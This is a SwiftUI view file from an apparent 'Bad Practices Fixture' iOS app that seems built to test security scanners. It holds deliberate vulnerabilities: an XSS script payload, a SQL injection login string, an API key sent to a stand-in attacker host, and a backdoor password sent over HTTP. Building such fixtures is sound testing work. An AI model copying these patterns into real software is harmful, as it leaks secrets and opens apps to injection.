//
//  ContentView.swift
//  BadPracticesIPA
//
//  Created by Ricardo Montesinos on 02/06/26.
//

import SwiftUI

struct ContentView: View {
    @State private var untrustedHTML: String = "<script>alert('xss')</script>"

    var body: some View {
        VStack(spacing: 16) {
            Text("Bad Practices Fixture")
                .font(.title)

            Button("Trigger bad logs") {
                BadSecrets.printBadLogs()
                _ = BadSecrets.buildUnsafeHeaders()
            }

            Button("Run weak crypto") {
                WeakCrypto.runAll()
            }

            Button("Persist secrets insecurely") {
                InsecureStorage.runAll()
            }

            Button("Save password in UserDefaults") {
                LoginManager.simulate()
            }

            Button("Run dangerous APIs") {
                DangerousAPIs.runAll()
            }

            Button("Run bad JWT validation") {
                JWTBadPractices.simulate()
            }

            Button("Send secrets over HTTP") {
                InsecureNetworking.shared.performLogin(
                    user: "admin",
                    password: BadSecrets.backdoorPassword
                )
                InsecureNetworking.shared.uploadSecretsViaHTTP()
                InsecureNetworking.shared.fetchUntrustedURL(
                    "http://attacker.fake-cacomi.com/steal?k=\(BadSecrets.productionApiKey)"
                )
                _ = InsecureQueries.buildLoginQuery(
                    user: "admin' OR 1=1 --",
                    password: "anything"
                )
                InsecureQueries.runFakeShell("ls /")
            }

            InsecureWebView(untrustedHTML: untrustedHTML)
                .frame(height: 120)
        }
        .padding()
        .onAppear {
            BadSecrets.printBadLogs()
            _ = BadSecrets.buildUnsafeHeaders()
            WeakCrypto.runAll()
            InsecureStorage.runAll()
        }
    }
}
#Preview {
    ContentView()
}
